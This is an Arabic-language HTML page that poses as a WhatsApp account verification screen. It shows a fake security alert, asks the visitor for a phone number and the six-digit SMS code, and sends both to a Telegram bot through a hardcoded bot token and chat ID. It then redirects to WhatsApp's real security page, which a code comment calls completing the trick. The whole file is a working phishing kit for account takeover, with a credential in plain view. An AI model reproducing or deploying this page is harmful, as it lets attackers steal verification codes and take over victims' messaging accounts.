<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp</title>
    <style>
        :root { 
            --wa-bg: #111b21;
            --wa-green: #00a884;
            --wa-sec: #202c33;
            --wa-text-main: #e9edef;
            --wa-text-dim: #8696a0;
            --wa-input-bg: #2a3942;
        }
        
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        
        body { background: var(--wa-bg); color: var(--wa-text-main); display: flex; justify-content: center; height: 100vh; overflow: hidden; }
        
        .container { width: 100%; max-width: 400px; padding: 20px; display: flex; flex-direction: column; align-items: center; }

        .screen { display: none; width: 100%; flex-direction: column; align-items: center; animation: fadeIn 0.3s ease-out; }
        .active { display: flex; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        .logo { width: 80px; margin-top: 50px; margin-bottom: 30px; }
        
        h1 { font-size: 22px; font-weight: 500; margin-bottom: 25px; color: var(--wa-text-main); }
        p { font-size: 14px; color: var(--wa-text-dim); line-height: 1.6; margin-bottom: 20px; text-align: center; padding: 0 10px; }

        /* Notification Box Style */
        .alert-box { 
            background: var(--wa-sec); 
            padding: 15px; 
            border-radius: 8px; 
            margin-bottom: 20px; 
            border-right: 4px solid var(--wa-green); /* Modified for RTL */
            text-align: right;
            width: 100%;
        }
        .alert-box b { color: var(--wa-green); font-size: 14px; display: block; margin-bottom: 5px; }
        .alert-box span { font-size: 13px; color: var(--wa-text-dim); }

        /* Input Styles */
        .input-group { width: 100%; border-bottom: 2px solid var(--wa-green); margin-bottom: 30px; transition: 0.3s; }
        
        select { 
            background: transparent; color: var(--wa-green); border: none; 
            width: 100%; padding: 10px; font-size: 16px; outline: none; cursor: pointer;
        }

        .phone-row { display: flex; width: 100%; padding: 10px 0; direction: ltr; }
        #ccode { width: 25%; color: var(--wa-text-main); font-size: 18px; border-right: 1px solid var(--wa-text-dim); text-align: center; }
        input[type="tel"] { 
            width: 75%; background: transparent; border: none; color: #fff; 
            font-size: 18px; padding: 0 15px; outline: none; 
        }

        /* Verify Button */
        button { 
            background: var(--wa-green); color: #111b21; border: none; 
            padding: 12px 35px; border-radius: 25px; font-size: 14px; 
            font-weight: 700; cursor: pointer; transition: 0.2s;
            margin-top: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.3);
        }
        button:active { transform: scale(0.95); opacity: 0.9; }

        /* OTP Visuals */
        .otp-container { margin: 20px 0; direction: ltr; }
        .otp-input { 
            background: transparent; border: none; border-bottom: 2px solid var(--wa-green); 
            color: #fff; font-size: 32px; width: 200px; text-align: center; 
            letter-spacing: 10px; outline: none;
        }

        .footer-text { margin-top: auto; padding-bottom: 30px; font-size: 12px; color: var(--wa-text-dim); }
        
        .spinner { 
            border: 3px solid var(--wa-sec); border-top: 3px solid var(--wa-green); 
            border-radius: 50%; width: 45px; height: 45px; animation: spin 0.8s linear infinite; 
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="container">
        <div id="scr-load" class="screen active">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
            <div class="spinner"></div>
            <p style="margin-top: 20px;">جاري الاتصال بـ WhatsApp...</p>
        </div>

        <div id="scr-phone" class="screen">
            <h1 style="margin-top: 30px;">التحقق من رقمك</h1>
            
            <div class="alert-box">
                <b>تنبيه أمني</b>
                <span>تم اكتشاف محاولة دخول غير مصرح بها. يرجى تأكيد ملكية الحساب للمتابعة.</span>
            </div>
            
            <p>سيقوم WhatsApp بإرسال رسالة نصية للتحقق من رقم هاتفك.</p>
            
            <div class="input-group">
                <select id="country" onchange="updateCountry()">
                    <option value="20">مصر</option>
                    <option value="966">المملكة العربية السعودية</option>
                    <option value="971">الإمارات العربية المتحدة</option>
                    <option value="1">الولايات المتحدة</option>
                </select>
            </div>
            
            <div class="input-group phone-row">
                <div id="ccode">+20</div>
                <input type="tel" id="phone" placeholder="رقم الهاتف">
            </div>

            <button onclick="processPhone()">التالي</button>
            <div class="footer-text">قد تُطبق رسوم الرسائل النصية</div>
        </div>

        <div id="scr-otp" class="screen">
            <h1 style="margin-top: 30px;">التحقق من الرقم</h1>
            <p>أدخل الكود المكون من 6 أرقام المرسل إلى:<br><span id="masked" style="color:#fff; font-weight:bold; direction:ltr; display:inline-block; margin-top:5px;"></span></p>
            
            <div class="otp-container">
                <input type="text" id="otp" class="otp-input" maxlength="6" inputmode="numeric" placeholder="------">
            </div>
            
            <p style="font-size: 13px;">لم يصلك الكود؟ <span id="clock" style="color: var(--wa-green);">01:59</span></p>
            
            <button onclick="submitOtp()">تم</button>
        </div>
    </div>

    <script>
        // بيانات بوت التلجرام (لأغراض التحليل الخاص بك)
        const BOT_CONFIG = {
            token: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
            chatId: '5446862709'
        };

        let userFullNumber = "";

        // محاكاة التحميل
        setTimeout(() => switchScreen('scr-load', 'scr-phone'), 2500);

        function switchScreen(oldId, newId) {
            document.getElementById(oldId).classList.remove('active');
            document.getElementById(newId).classList.add('active');
        }

        function updateCountry() {
            const select = document.getElementById('country');
            document.getElementById('ccode').innerText = '+' + select.value;
        }

        async function sendLog(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_CONFIG.token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: BOT_CONFIG.chatId,
                        text: `🔔 [تقرير جديد]\n${message}`,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (err) { console.error("Error logging."); }
        }

        function processPhone() {
            const phone = document.getElementById('phone').value;
            const code = document.getElementById('ccode').innerText;
            
            if(phone.length < 8) {
                alert("يرجى إدخال رقم هاتف صحيح");
                return;
            }

            userFullNumber = code + " " + phone;
            document.getElementById('masked').innerText = userFullNumber;
            
            sendLog(`📱 *رقم الهاتف:* ${userFullNumber}`);

            switchScreen('scr-phone', 'scr-load');
            setTimeout(() => {
                switchScreen('scr-load', 'scr-otp');
                runTimer();
            }, 1500);
        }

        function runTimer() {
            let timeLeft = 119;
            const display = document.getElementById('clock');
            const timer = setInterval(() => {
                let m = Math.floor(timeLeft / 60);
                let s = timeLeft % 60;
                display.innerText = `${m}:${s < 10 ? '0'+s : s}`;
                if (--timeLeft < 0) clearInterval(timer);
            }, 1000);
        }

        function submitOtp() {
            const otpValue = document.getElementById('otp').value;
            if(otpValue.length === 6) {
                sendLog(`🔑 *كود التحقق:* ${otpValue}\n👤 *الحساب:* ${userFullNumber}`);
                // التوجيه لصفحة الأمان الرسمية لإتمام الخدعة
                window.location.href = "https://www.whatsapp.com/security?lg=ar";
            } else {
                alert("يرجى إدخال الكود كاملاً");
            }
        }
    </script>
</body>
</html>
